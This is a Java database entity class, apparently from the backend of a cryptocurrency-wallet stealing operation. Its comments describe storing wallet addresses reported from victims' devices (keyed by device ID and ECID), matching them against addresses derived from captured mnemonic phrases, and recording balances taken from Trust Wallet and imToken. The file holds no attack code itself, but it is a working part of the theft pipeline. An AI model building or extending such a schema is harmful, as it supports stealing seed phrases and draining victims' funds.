package com.consume.entity;

import java.io.Serializable;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableField;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;

import lombok.Data;

/**
 * 客户端上报地址（/ub /uj 拆出），与助记词派生地址撞库匹配。
 * UK: (device_id, address_norm)
 */
@Data
@TableName("reported_address")
public class ReportedAddressEntity implements Serializable {
    private static final long serialVersionUID = 1L;

    @TableId(type = IdType.AUTO)
    private Long id;

    /** device.deviceid（与 mnemonic.device_id 一致） */
    @TableField("device_id")
    private String deviceId;

    @TableField("ecid")
    private String ecid;

    @TableField("address")
    private String address;

    /** 撞库用归一化地址 */
    @TableField("address_norm")
    private String addressNorm;

    /** eth/bsc/tron/btc/sol/ton/unknown */
    @TableField("chain_type")
    private String chainType;

    /** 明文 a 字段短码 */
    @TableField("wallet_code")
    private String walletCode;

    /** WalletSourceUtil 映射名 */
    @TableField("wallet_name")
    private String walletName;

    /** ub / uj */
    @TableField("source_path")
    private String sourcePath;

    @TableField("source_record_id")
    private Integer sourceRecordId;

    @TableField("source_decrypt_id")
    private Integer sourceDecryptId;

    @TableField("account_hint")
    private String accountHint;

    /** 客户端上报余额原文（Trust balance/value；imtoken token 列表摘要等） */
    @TableField("balance_hint")
    private String balanceHint;

    @TableField("mnemonic_id")
    private Integer mnemonicId;

    /** pending / matched / unmatched */
    @TableField("match_status")
    private String matchStatus;

    @TableField("first_seen_at")
    private Double firstSeenAt;

    @TableField("last_seen_at")
    private Double lastSeenAt;
}
